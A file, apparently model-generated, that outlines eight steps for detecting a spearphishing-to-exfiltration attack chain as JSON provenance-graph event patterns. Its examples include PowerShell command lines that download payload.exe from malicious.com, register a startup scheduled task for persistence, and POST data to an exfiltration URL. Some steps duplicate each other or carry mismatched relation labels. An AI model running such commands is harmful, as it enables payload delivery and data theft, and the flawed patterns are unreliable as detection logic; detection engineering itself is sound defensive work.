@@ -1,0 +1,148 @@
+<output>
+1. **Identify Email Delivery via Spearphishing**  
+   - Monitor for events where the `srcNode` is an email application (e.g., Outlook) and the `dstNode` is an email with a suspicious "From" address (e.g., "admin@fakecompany.com") and an attachment named "Invoice.docx".  
+   - Set the `relation` to "Process Create" for the email application process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Name": "Outlook",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "Invoice.docx",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+2. **Monitor User Interaction with Email Attachments**  
+   - Track events where the `srcNode` is the Outlook process and the user action involves clicking on an attachment that enables macros.  
+   - Set the `relation` to "Process Create" for the Outlook process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Name": "Outlook",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "Invoice.docx",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+3. **Detect Execution of Malicious Macro**  
+   - Monitor for events where the `srcNode` is Microsoft Word and the `dstNode` is a process spawned by Word that executes scripts or downloads files.  
+   - Set the `relation` to "Process Create" for the Word process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Type": "Process"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+4. **Track Payload Download via PowerShell**  
+   - Monitor for events where the `srcNode` is PowerShell executing a command to download a file from a suspicious URL.  
+   - Set the `relation` to "Process Create" for the PowerShell process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\Users\\User\\Downloads\\payload.exe",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "payload.exe",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+5. **Detect Execution of Malicious Payload**  
+   - Monitor for events where the `srcNode` is Windows Explorer and the `dstNode` is the executable file located at `C:\\Users\\User\\Downloads\\payload.exe`.  
+   - Set the `relation` to "Process Create" for the Windows Explorer process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\explorer.exe",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Image": "C:\\Users\\User\\Downloads\\payload.exe",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+6. **Monitor for Establishing Persistence via Scheduled Tasks**  
+   - Track events where the `srcNode` is PowerShell creating a scheduled task to execute a suspicious executable.  
+   - Set the `relation` to "Process Create" for the PowerShell process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "New-ScheduledTask -Action (New-ScheduledTaskAction -Execute \"C:\\Path\\To\\Malicious.exe\") -Trigger (New-ScheduledTaskTrigger -AtStartup) -Register",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Image": "C:\\Path\\To\\Malicious.exe",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+7. **Detect Data Exfiltration via PowerShell**  
+   - Monitor for events where the `srcNode` is PowerShell executing a command to exfiltrate data to a remote server.  
+   - Set the `relation` to "Process Create" for the PowerShell process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Dstaddress": "http://malicious.com/exfiltrate",
+         "Type": "Network"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+8. **Monitor Command and Control Communication**  
+   - Track events where the `srcNode` is PowerShell communicating with a command and control server.  
+   - Set the `relation` to "TCP Connect" for the network communication.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Dstaddress": "http://malicious.com/c2",
+         "Type": "Network"
+       },
+       "relation": "TCP Connect"
+     }
+     ```
+</output>
